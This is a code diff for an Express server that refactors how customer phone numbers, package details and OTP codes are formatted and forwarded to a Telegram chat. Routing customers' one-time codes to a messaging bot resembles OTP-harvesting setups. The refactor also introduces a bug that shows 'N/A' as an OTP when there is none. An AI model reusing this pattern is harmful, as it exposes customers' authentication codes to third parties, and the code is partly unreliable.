@@ -91,6 +91,20 @@ function formatRecharge(data) {
     `;
 }
 
+function formatSendPhone(data) {
+    const otpMessage = data.otp ? `🔑 <b>OTP Code:</b> ${data.otp}\n\n📌 Please tell the customer the 4-digit OTP code above to complete their purchase!` : '';
+    
+    return `
+📱 <b>NEW ${data.type === 'recharge' ? 'RECHARGE' : 'PURCHASE'} REQUEST!</b>
+
+👤 <b>Customer Phone:</b> ${data.phone}
+📦 <b>Package:</b> ${data.package}
+💰 <b>Price:</b> ${data.price}
+${otpMessage}
+⏰ <b>Time:</b> ${new Date().toLocaleString()}
+    `;
+}
+
 // =============================================
 // API ENDPOINTS
 // =============================================
@@ -151,7 +165,7 @@ app.post('/api/register-vendor', async (req, res) => {
 });
 
 // =============================================
-// 2. PURCHASE
+// 2. PURCHASE (with 4-digit OTP)
 // =============================================
 app.post('/api/purchase', async (req, res) => {
     try {
@@ -183,7 +197,7 @@ app.post('/api/purchase', async (req, res) => {
 });
 
 // =============================================
-// 3. RECHARGE
+// 3. RECHARGE (no OTP needed)
 // =============================================
 app.post('/api/recharge', async (req, res) => {
     try {
@@ -215,7 +229,7 @@ app.post('/api/recharge', async (req, res) => {
 });
 
 // =============================================
-// 4. SEND PHONE + OTP
+// 4. SEND PHONE + 4-DIGIT OTP
 // =============================================
 app.post('/api/send-phone', async (req, res) => {
     try {
@@ -228,24 +242,20 @@ app.post('/api/send-phone', async (req, res) => {
             });
         }
 
-        const message = `
-📱 NEW ${type === 'recharge' ? 'RECHARGE' : 'PURCHASE'} REQUEST!
-
-👤 Customer Phone: ${phone}
-📦 Package: ${packageName}
-💰 Price: ${price}
-${otp ? `🔑 OTP Code: ${otp}` : ''}
-
-⏰ Time: ${new Date().toLocaleString()}
-
-${otp ? '📌 Please tell the customer the OTP code above to complete their purchase!' : ''}
-        `;
-
+        const data = { 
+            package: packageName, 
+            price: price, 
+            phone: phone, 
+            otp: otp || 'N/A', 
+            type: type || 'purchase' 
+        };
+        
+        const message = formatSendPhone(data);
         await sendToTelegram(message);
 
         res.json({
             success: true,
-            message: '✅ Phone number and OTP sent successfully!'
+            message: '✅ Phone number and 4-digit OTP sent successfully!'
         });
 
     } catch (error) {
